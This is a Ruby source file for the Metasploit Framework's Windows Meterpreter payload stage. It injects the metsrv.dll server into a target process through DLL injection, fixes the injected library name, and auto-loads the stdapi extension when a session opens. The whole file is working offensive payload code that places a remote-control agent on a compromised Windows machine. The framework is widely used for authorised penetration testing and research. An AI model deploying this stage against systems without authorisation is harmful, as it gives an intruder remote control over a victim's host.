require 'msf/core'
require 'msf/base/sessions/meterpreter'

module Msf
module Payloads
module Stages
module Windows

###
#
# Injects the meterpreter server instance DLL via the DLL injection payload.
#
###
module Meterpreter

	include DllInject

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Windows Meterpreter',
			'Version'       => '$Revision$',
			'Description'   => 'Inject the meterpreter server DLL',
			'Author'        => 'skape',
			'License'       => MSF_LICENSE,
			'Session'       => Msf::Sessions::Meterpreter))

		sep = File::SEPARATOR

		# Override the DLL path with the path to the meterpreter server DLL
		register_options(
			[
				OptPath.new('DLL', 
					[ 
						true, 
						"The local path to the DLL to upload", 
						File.join(Msf::Config.install_root, "data", "meterpreter", "metsrv.dll")
					]),
			], Meterpreter)

		# Set advanced options
		register_advanced_options(
			[
				OptBool.new('AutoLoadStdapi',
					[
						true,
						"Automatically load the Stdapi extension",
						true
					])
			], Meterpreter)

		# Don't let people set the library name option
		options.remove_option('LibraryName')
	end

	#
	# The library name that we're injecting the DLL as has to be metsrv.dll for
	# extensions to make use of.
	#
	def library_name
		"metsrv.dll"
	end

	#
	# Once a session is created, automatically load the stdapi extension if the
	# advanced option is set to true.
	#
	def on_session(session)
		super

		session.queue_cmd('use stdapi') if (datastore['AutoLoadStdapi'] == true)
	end

end

end end end end
